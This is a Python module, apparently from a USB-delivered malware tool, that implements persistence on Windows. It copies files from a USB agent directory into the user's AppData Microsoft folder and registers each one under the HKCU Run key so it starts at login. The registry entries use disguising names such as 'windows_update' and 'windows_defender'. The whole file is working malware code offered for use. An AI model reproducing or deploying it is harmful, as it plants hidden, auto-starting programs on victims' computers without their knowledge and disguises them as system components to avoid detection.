# -*- coding: utf-8 -*-

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import os
import subprocess
import shutil
import random

from core.splendente_error import ERROR_FILE_NOT_FOUND, ERROR_FILE_EMPTY, EXIT_SUCCESS

#--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#

class Persistence:

    def __init__(self):
        self.targetDirPath          = os.environ["APPDATA"] + "\\Microsoft"
        self.targetRegisterPath     = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        self.targetRegisterVersion  = [
                                        " /v windows_update", 
                                        " /v windows_tasks", 
                                        " /v windows_system", 
                                        " /v windows_defender",
                                        " /v windows_scheduler",
                                        " /v windows_network",
                                        " /v windows_scanning"
                                        ] 
        self.targetRegisterType         = " /t REG_SZ"
        self.RegisterVersionALreadyUsed = []

    def Registry(self, agentUsbDirectory):
        if not os.listdir(agentUsbDirectory):
            return ERROR_FILE_NOT_FOUND
        else:
            for files in os.listdir(agentUsbDirectory):
                if files != "yourFile.exe":
                    if os.path.isfile(self.targetDirPath + "\\" + files) == False:
                        shutil.copy(agentUsbDirectory + "\\" + files, self.targetDirPath)

                        if os.path.exists(self.targetDirPath + "\\" + files) == True:   
                            if os.path.getsize(self.targetDirPath + "\\" + files) > 0:
                                targetFile = " /d " + self.targetDirPath + "\\{0}".format(files)
                                targetRegisterVersion = "{0}".format(random.choice(self.targetRegisterVersion))

                                self.RegisterVersionALreadyUsed.append(targetRegisterVersion)

                                for version in self.RegisterVersionALreadyUsed:
                                    if version == targetRegisterVersion:
                                        while version == targetRegisterVersion:
                                            targetRegisterVersion = "{0}".format(random.choice(self.targetRegisterVersion))
                                            if version != targetRegisterVersion:
                                                break

                                subprocess.run(self.targetRegisterPath + targetRegisterVersion + self.targetRegisterType + targetFile, shell=True, timeout=3)
                            else:
                                return ERROR_FILE_EMPTY
                        else:
                            return ERROR_FILE_NOT_FOUND               
            return EXIT_SUCCESS
